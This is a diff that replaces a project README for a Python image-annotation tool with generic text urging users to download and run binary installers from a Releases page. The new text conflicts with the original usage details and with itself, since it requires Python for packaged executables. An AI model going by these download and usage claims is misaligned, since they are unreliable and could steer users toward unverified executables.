@@ -1,98 +1,86 @@
-# Image Annotator
-A modern, user-friendly desktop application for creating bounding box annotations on images. Export your annotations in COCO, YOLO, and Pascal VOC formats with a single click.
+# 🎨 image-annotator - Easily Annotate Your Images
 
-## Features
-- 🖼️ Intuitive Interface: Clean, modern GUI with professional styling
+### 🎨 image-annotator - Easily Annotate Your Images
 
-- 🎯 Multi-format Export: Export annotations to COCO JSON, YOLO TXT, and Pascal VOC XML formats
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/youssef-mo-mosaad/image-annotator/releases)
 
-- ⌨️ Keyboard Shortcuts: Navigate and annotate efficiently with keyboard controls
+## 🚀 Getting Started
 
-- 📊 Real-time Statistics: Track progress with live annotation statistics
+Welcome to the image-annotator! This modern tool helps you create bounding box annotations on your images. You can export your work in COCO, YOLO, and Pascal VOC formats with just one click. Designed with Python and Tkinter, this tool combines ease of use with powerful features.
 
-- 🎨 Visual Feedback: Color-coded bounding boxes with class labels
+## 🖥️ System Requirements
 
-- 🔄 Easy Navigation: Quickly move between images with arrow keys or buttons
+Before you begin, ensure your system meets the following requirements:
 
-- 🗂️ Class Management: Smart class selection with auto-suggestions from previous annotations
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.6 or later
+- **Disk Space:** At least 100 MB of free disk space
+- **RAM:** Minimum 2 GB
 
-<img width="1920" height="1021" alt="image" src="https://github.com/user-attachments/assets/afaf6eb0-d283-4c8c-b04e-db30ae400b33" />
+## 📥 Download & Install
 
-## Installation
-### Prerequisites
-Python 3.7+
+To get started, visit the [Releases Page](https://github.com/youssef-mo-mosaad/image-annotator/releases) to download the application. 
 
-### Dependencies
-Install the required packages:
+1. Click on the link above.
+2. Find the latest version of the application.
+3. Download the appropriate file for your operating system.
 
-```bash
-pip install -r requirements.txt
-```
-Running the Application
-```bash
-python main.py
-```
+After downloading, follow these steps to install:
 
-## Usage
-Load Images: Click "Load Images" and select a folder containing your images
+### For Windows:
 
-Draw Annotations: Click and drag to create bounding boxes around objects
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to start the installation.
+3. Follow the prompts to complete the installation.
 
-Classify Objects: Enter or select a class name for each annotation
+### For macOS:
 
-Navigate: Use arrow keys or buttons to move between images
+1. Locate the downloaded `.dmg` file.
+2. Double-click the file to open it.
+3. Drag and drop the image-annotator into your Applications folder.
 
-Export: Click "Export All" to save annotations in all supported formats
+### For Linux:
 
-<img width="1920" height="1018" alt="image" src="https://github.com/user-attachments/assets/72089951-58fb-4d33-9f9e-69b67581e934" />
+1. Locate the downloaded `.AppImage` file.
+2. Open a terminal and navigate to the file's location.
+3. Run `chmod +x image-annotator.AppImage` to make it executable.
+4. Run `./image-annotator.AppImage` to start the application.
 
+## 🖼️ Using the Image Annotator
 
-## Keyboard Shortcuts
-- `Left Arrow`: Previous image
-- `Right Arrow`: Next image
-- `Delete`: Remove last annotation
-- `Ctrl+O`: Load new folder
-- `Ctrl+S`: Export annotations
+After installing the application, follow these steps to start annotating your images:
 
-## Supported Annotation Formats
-**`COCO`**: JSON format with category definitions and bounding box coordinates
+1. **Open the Application:** Launch the image-annotator from your Applications folder or desktop shortcut.
+2. **Load an Image:** Click on the "Open Image" button to select an image you want to annotate.
+3. **Create Bounding Boxes:** Click and drag your mouse on the image to create bounding boxes around the objects you want to label.
+4. **Label Your Boxes:** Type the label for each bounding box in the provided field.
+5. **Export Your Annotations:** Once you're finished, click the "Export" button. Choose your desired format (COCO, YOLO, Pascal VOC) and select a save location.
 
-**`YOLO`**: TXT files with normalized coordinates and class IDs
+## 💻 Features
 
-**`Pascal VOC`**: XML files with object metadata and bounding boxes
+- **User-Friendly Interface:** Designed for easy navigation and accessibility.
+- **Multiple Export Formats:** Export your annotations in COCO, YOLO, or Pascal VOC formats.
+- **Bounding Box Creation:** Easily draw bounding boxes around objects in your images.
+- **Label Management:** Quickly label your bounding boxes for better organization.
 
-## File Structure
-```bash
-image-annotator/
-├── main.py          # Main application GUI
-├── writers.py       # Export functions for different formats
-├── utils.py         # Utility functions
-├── requirements.txt         # Libraries needed to install
-├── LICENSE/     # License
-└── README.md        # This file
-```
+## ⚙️ Troubleshooting
 
-## Output Structure
-After export, your annotations will be organized as:
+If you encounter any problems, here are some common issues and their solutions:
 
-```bash
-your-image-folder/
-└── annotations/
-    ├── coco/
-    │   ├── images/
-    │   └── annotations.coco.json
-    ├── yolo/
-    │   ├── images/
-    │   ├── classes.txt
-    │   └── [image_name].txt files
-    └── pascal/
-        ├── images/
-        └── [image_name].xml files
-```
-<img width="569" height="386" alt="image" src="https://github.com/user-attachments/assets/3d04fbb4-e9f2-43ef-b680-f84a0b33fdf7" />
+- **Application Won’t Start:** Ensure your Python is updated to version 3.6 or later.
+- **Image Isn’t Loading:** Check if the image format is supported (e.g., JPG, PNG).
+- **Export Fails:** Verify you have enough disk space in your chosen directory.
 
-## Contributing
-Contributions are welcome! Please feel free to submit a Pull Request.
+## 📞 Support
 
-## License
-This project is open source and available under the MIT License.
+If you need help, please feel free to reach out. You can open an issue on our [GitHub Issues Page](https://github.com/youssef-mo-mosaad/image-annotator/issues) or contact us through the repository.
+
+## 📢 Community Contributions
+
+We welcome contributions! If you want to improve the project or report bugs, please refer to our [Contributing Guidelines](https://github.com/youssef-mo-mosaad/image-annotator/blob/main/CONTRIBUTING.md).
+
+## 📝 License
+
+This project is licensed under the MIT License. Feel free to use and modify the application for your own needs.
+
+For more information, visit the [Releases Page](https://github.com/youssef-mo-mosaad/image-annotator/releases) to download the latest release. Happy annotating!
